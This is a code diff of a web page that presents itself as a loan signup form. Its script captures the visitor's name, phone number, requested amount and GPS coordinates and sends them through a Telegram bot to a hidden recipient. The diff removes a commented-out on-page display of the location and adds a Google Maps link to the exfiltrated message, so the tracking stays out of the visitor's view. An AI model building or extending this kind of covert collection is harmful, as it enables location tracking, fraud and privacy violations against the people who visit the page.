@@ -11,8 +11,8 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-image: url('butteryflyposter.png'); /* Reference to the background image */
-            background-size: cover; /* Cover the entire background */
+            background-image: url('butteryflyposter.png'); /* Use the butterflyposter.png as background */
+            background-size: cover; /* Ensure the background covers the entire page */
             background-repeat: no-repeat; /* Prevent the background from repeating */
             background-position: center; /* Center the background image */
         }
@@ -100,11 +100,6 @@
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
 
-            // We don't display latitude and longitude on the website now
-            // document.getElementById("location").innerHTML = 
-            // "Latitude: " + latitude + 
-            // "<br>Longitude: " + longitude;
-
             sendLocationToTelegram(latitude, longitude);
         }
 
@@ -135,7 +130,10 @@
             var phone = document.getElementById('phone').value;
             var amount = document.getElementById('amount').value;
 
-            var message = `New Loan Signup:\nName: ${name}\nPhone Number: ${phone}\nLoan Amount: $${amount}\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+            // Construct the Google Maps link using latitude and longitude
+            var googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            var message = `New Loan Signup:\nName: ${name}\nPhone Number: ${phone}\nLoan Amount: $${amount}\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: ${googleMapsLink}`;
 
             var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
